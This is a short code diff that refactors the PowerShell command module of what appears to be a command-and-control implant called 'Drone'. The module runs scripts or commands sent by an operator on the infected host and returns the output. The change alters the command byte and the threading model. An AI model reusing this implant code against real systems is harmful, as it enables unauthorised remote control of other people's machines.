@@ -1,23 +1,19 @@
 ﻿using System.Text;
 using System.Threading;
-using System.Threading.Tasks;
-
-using Drone.Models;
-using Drone.Utilities;
 
 namespace Drone.Commands;
 
 public sealed class PowerShell : DroneCommand
 {
-    public override byte Command => 0x10;
-    
-    public override async Task Execute(DroneTask task, CancellationToken cancellationToken)
+    public override byte Command => 0x3D;
+    public override bool Threaded => true;
+
+    public override void Execute(DroneTask task, CancellationToken cancellationToken)
     {
         using var runner = new PowerShellRunner();
 
         string script = null;
         
-        // if task has a script, ignore imported scripts
         if (task.Artefact is not null && task.Artefact.Length > 0)
         {
             script = Encoding.ASCII.GetString(task.Artefact);
@@ -38,6 +34,6 @@ public sealed class PowerShell : DroneCommand
         var command = string.Join(" ", task.Arguments);
         var result = runner.Invoke(command);
             
-        await Drone.SendOutput(task, result);
+        Drone.SendTaskOutput(task.Id, result);
     }
 }
